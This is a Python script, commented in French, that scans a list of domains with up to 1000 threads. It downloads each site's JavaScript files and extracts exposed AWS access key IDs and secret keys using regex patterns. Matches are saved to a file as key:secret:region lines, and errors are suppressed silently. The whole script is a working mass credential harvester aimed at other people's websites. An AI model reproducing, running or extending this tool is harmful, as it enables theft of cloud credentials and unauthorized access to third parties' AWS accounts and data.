import requests
from bs4 import BeautifulSoup
import urllib.parse
import re
import concurrent.futures
from colorama import init, Fore, Style
import threading

init(autoreset=True)

print_lock = threading.Lock()  # Verrou pour les opérations d'impression

# Fonction pour récupérer les chemins des fichiers JS pour un domaine donné
def get_js_paths(domain):
    # Supprimer la gestion d'exception ici pour éviter d'imprimer les erreurs

    # Récupérer le contenu HTML du domaine
    response = requests.get(domain, timeout=5)  # Vous pouvez ajuster le délai (timeout) selon vos besoins.
    response.raise_for_status()  # Vérifier si la requête a réussi

    soup = BeautifulSoup(response.text, 'html.parser')

    # Trouver tous les tags script avec un attribut src
    scripts = soup.find_all('script', src=True)

    # Extraire les chemins des fichiers JS
    js_paths = [urllib.parse.urljoin(domain, script['src']) for script in scripts]

    return js_paths

def search_secret_key_in_js(js_path, akia_key):
    try:
        response = requests.get(js_path, timeout=5)
        response.raise_for_status()
        js_content = response.text

        # Rechercher le modèle de clé secrète dans le contenu JS
        pattern = r'(?i)(secret[_-]?access[_-]?key|secret[_-]?key|Secret[_-]?Key|SECRET[_-]?ACCESS[_-]?KEY|secret|sAccessKey|s_key|SKey|aws[_-]?region|aws[_-]?key|aws[_-]?secret|aws[_-]?session|aws[_-]?token)\s*[:=]\s*"([A-Za-z0-9/+=]{40,})"'
        secret_keys = [match[1] for match in re.findall(pattern, js_content)]

        if secret_keys:
            for secret_key in secret_keys:
                with print_lock:
                    # Imprimer la clé AKIA, la clé secrète et le fichier JS
                    print(f"[{Fore.GREEN}+{Style.RESET_ALL}] {akia_key} - Save")
                
                with open("akia_secret_keys.txt", "a") as output_file:
                    # Enregistrer la clé AKIA, la clé secrète et le fichier JS dans le fichier texte
                    output_file.write(f"{akia_key}:{secret_key}:us-east-1\n")
    except requests.exceptions.RequestException as e:
        # Gérer l'erreur silencieusement (ne rien faire en cas d'erreur)
        pass

def search_akia_in_js(js_path):
    try:
        response = requests.get(js_path, timeout=5)
        response.raise_for_status()
        js_content = response.text

        # Rechercher le modèle AKIA[A-Z0-9]{16} dans le contenu JS
        akia_keys = re.findall(r'AKIA[A-Z0-9]{16}', js_content)

        if akia_keys:
            for akia_key in akia_keys:
                # Après avoir trouvé la clé AKIA, cherchez la clé secrète
                search_secret_key_in_js(js_path, akia_key)
    except requests.exceptions.RequestException as e:
        # Gérer l'erreur silencieusement (ne rien faire en cas d'erreur)
        pass

def process_domain(domain):
    # Compléter le domaine avec "https://www."
    full_domain = "https://www." + domain

    # Appeler la fonction pour récupérer les chemins JS
    try:
        js_paths = get_js_paths(full_domain)

        # Vérifier si des chemins JS ont été trouvés avant de rechercher les clés AKIA
        if js_paths:
            for path in js_paths:
                with print_lock:
                    # Afficher le fichier JS trouvé
                    print(f"[{Fore.YELLOW}?{Style.RESET_ALL}] {path} - Download")
                search_akia_in_js(path)  # Rechercher AKIA dans le fichier JS
    except requests.exceptions.RequestException as e:
        # Gérer l'erreur silencieusement (ne rien faire en cas d'erreur)
        pass

if __name__ == "__main__":
    with open("domains.txt", "r") as file:
        domains = file.read().splitlines()

    max_threads = 1000  # Nombre maximal de threads en parallèle

    with concurrent.futures.ThreadPoolExecutor(max_threads) as executor:
        executor.map(process_domain, domains)
